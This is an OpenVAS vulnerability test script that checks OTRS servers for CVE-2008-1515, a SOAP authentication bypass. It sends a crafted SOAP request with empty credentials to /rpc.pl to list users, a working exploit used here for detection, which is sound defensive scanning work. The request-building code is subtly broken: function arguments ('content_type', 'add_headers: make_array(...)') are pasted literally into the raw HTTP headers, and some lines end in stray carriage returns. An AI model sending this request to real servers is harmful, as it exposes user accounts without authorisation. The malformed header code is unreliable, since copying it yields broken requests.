###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_otrs_soap_sec_bypass_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# OTRS SOAP Security Bypass Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803947";
CPE = "cpe:/a:otrs:otrs";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2008-1515");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-28 13:08:01 +0530 (Sat, 28 Sep 2013)");
  script_name("OTRS SOAP Security Bypass Vulnerability");


tag_summary =
"This host is installed with OTRS (Open Ticket Request System) and is prone to
security bypass vulnerability.";

tag_vuldetect =
"Send a Crafted HTTP POST request and check whether it is able to get OTRS users.";

tag_insight =
"An error exists in SOAP interface which fails to properly validate user
credentials before performing certain actions";

tag_impact =
"Successful exploitation will allow remote attackers to read and modify objects
via the OTRS SOAP interface .

Impact Level: Application";

tag_affected =
"OTRS (Open Ticket Request System) version 2.1.0 before 2.1.8 and 2.2.0 before 2.2.6";

tag_solution =
"Upgrade to OTRS (Open Ticket Request System) version 2.1.8 or 2.2.6 or later,
For updates refer to http://www.otrs.com/en/";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/74094");
  script_summary("Check if we can retrive OTRS user through SOAP request");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("secpod_otrs_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("OTRS/installed");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

## Variable initialisation
port = "";
loca = "";
post = "";
len = "";
host = "";
result = "";

## Get Application HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

if(loca = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))
{
  post = string('<?xml version="1.0" encoding="UTF-8"?>\r\n',
         '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\r\r\n',
         '      xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"\r\r\n',
         '      xmlns:xsd="http://www.w3.org/2001/XMLSchema"\r\r\n',
         '      soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"\r\r\n',
         '      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n',
         '<soap:Body>\r\n',
         '  <Dispatch xmlns="/Core">\r\n',
         '    <c-gensym4 xsi:type="xsd:string" />\r\n',      # username == "null"
         '    <c-gensym6 xsi:type="xsd:string" />\r\n',      # password == "null"
         '    <c-gensym8 xsi:type="xsd:string">UserObject</c-gensym8>\r\n',
         '    <c-gensym10 xsi:type="xsd:string">UserList</c-gensym10>\r\n',
         '    </Dispatch>\r\n',
         ' </soap:Body>\r\n',
         '</soap:Envelope>');
  len = strlen(post);
  host = get_host_name();

  req = string('POST ',loca,'/rpc.pl HTTP/1.1\r\n',
             'Host: ',host,'\r\n',
             'User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:12.0) Gecko/20100101 Firefox/12.0\r\n',
             'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n',
             'Accept-Language: en-us,en;q=0.5\r\n',
             'Connection: keep-alivecontent_type: "text/xml"\r\n',
             'add_headers: make_array("SOAPAction", "/Core#Dispatch")\r\n',
             'Pragma: no-cache\r\n',
             'Cache-Control: no-cache\r\n',
             'Content-Length: ',len,'\r\n',
             '\r\n',
             post);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:1);

  if(result && "s-gensym" >< result && "xsd:int" >< result)
  {
    security_hole(port:port);
    exit(0);
  }
}
